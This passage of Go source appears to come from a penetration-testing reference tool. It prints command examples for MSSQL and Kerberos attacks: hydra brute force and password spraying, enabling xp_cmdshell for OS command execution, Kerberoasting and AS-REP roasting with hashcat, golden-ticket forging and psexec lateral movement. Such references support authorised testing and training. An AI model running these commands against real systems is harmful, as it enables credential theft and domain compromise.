	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("impacket-mssqlclient user:pass@<target>"))
	fmt.Println("    " + Yellow("impacket-mssqlclient -windows-auth domain/user:pass@<target>"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("MSSQL enumeration (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec mssql <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("MSSQL scanning & database enumeration"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/mssql/mssql_login") + "  " + Cyan("# credential validation"))
	fmt.Println("    " + Yellow("auxiliary/admin/mssql/mssql_enum") + "  " + Cyan("# enumerate databases"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("Bruteforce MSSQL authentication"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -l sa -P wordlist.txt mssql://<target>"))
	fmt.Println("    " + Yellow("hydra -L users.txt -P passwords.txt mssql://<target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Credential validation & password spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec mssql <target> -u user -p pass"))
	fmt.Println("    " + Yellow("netexec mssql <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("Credential validation (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec mssql <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("MSSQL login attempts"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/mssql/mssql_login"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("impacket-mssqlclient"))
	fmt.Println("  " + Cyan("Enable xp_cmdshell & execute OS commands"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"))
	fmt.Println("    " + Yellow("EXEC xp_cmdshell 'whoami';"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Post-auth command execution"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec mssql <target> -u user -p pass -x \"whoami\""))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("Payload execution via MSSQL"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/admin/mssql/mssql_exec") + "  " + Cyan("# execute commands"))
	fmt.Println("    " + Yellow("exploit/windows/mssql/mssql_payload") + "  " + Cyan("# payload via xp_cmdshell"))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

func infoKerberos(){
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("KERBEROS"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Kerberos pre-authentication disabled (AS-REP roastable)"))
	fmt.Println("- " + Red("Service accounts with weak passwords"))
	fmt.Println("- " + Red("SPN accounts vulnerable to Kerberoasting"))
	fmt.Println("- " + Red("Unconstrained delegation enabled"))
	fmt.Println("- " + Red("Constrained delegation misconfigured"))
	fmt.Println("- " + Red("Excessive privileges assigned to service accounts"))
	fmt.Println("- " + Red("Domain controllers exposed to internet"))
	fmt.Println("- " + Red("Clock skew misconfiguration"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Kerberos & domain enumeration"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec ldap <target> -u user -p pass --users"))
	fmt.Println("    " + Yellow("netexec smb <target> -u user -p pass --spns"))

	fmt.Println()
	fmt.Println(Green("impacket-GetUserSPNs"))
	fmt.Println("  " + Cyan("Enumerate Service Principal Names (Kerberoast targets)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("impacket-GetUserSPNs domain/user:pass -dc-ip <dc_ip>"))

	fmt.Println()
	fmt.Println(Green("impacket-GetNPUsers"))
	fmt.Println("  " + Cyan("Find AS-REP roastable users (no pre-auth)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("impacket-GetNPUsers domain/ -dc-ip <dc_ip> -no-pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("Kerberos related enumeration modules"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/gather/get_user_spns"))
	fmt.Println("    " + Yellow("auxiliary/gather/asrep_roast"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("impacket-GetUserSPNs"))
	fmt.Println("  " + Cyan("Kerberoasting (extract TGS hashes)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("impacket-GetUserSPNs domain/user:pass -dc-ip <dc_ip> -request"))

	fmt.Println()
	fmt.Println(Green("impacket-GetNPUsers"))
	fmt.Println("  " + Cyan("AS-REP roasting (no pre-auth users)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("impacket-GetNPUsers domain/ -dc-ip <dc_ip> -request -format hashcat"))

	fmt.Println()
	fmt.Println(Green("hashcat"))
	fmt.Println("  " + Cyan("Offline cracking of Kerberos hashes"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hashcat -m 18200 hashes.txt wordlist.txt"))
	fmt.Println("    " + Yellow("hashcat -m 13100 hashes.txt wordlist.txt"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Credential validation (post-crack)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec smb <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("impacket-ticketer"))
	fmt.Println("  " + Cyan("Golden / Silver Ticket generation"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("impacket-ticketer -nthash <krbtgt_hash> -domain domain.local user"))

	fmt.Println()
	fmt.Println(Green("impacket-psexec"))
	fmt.Println("  " + Cyan("Kerberos authentication for remote execution"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("impacket-psexec -k -no-pass domain/user@<target>"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("Kerberos ticket abuse modules"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/admin/kerberos/golden_ticket"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Post-auth lateral movement using Kerberos"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec smb <target> -k -x \"whoami\""))

	fmt.Println(Cyan("────────────────────────────────────────"))

}
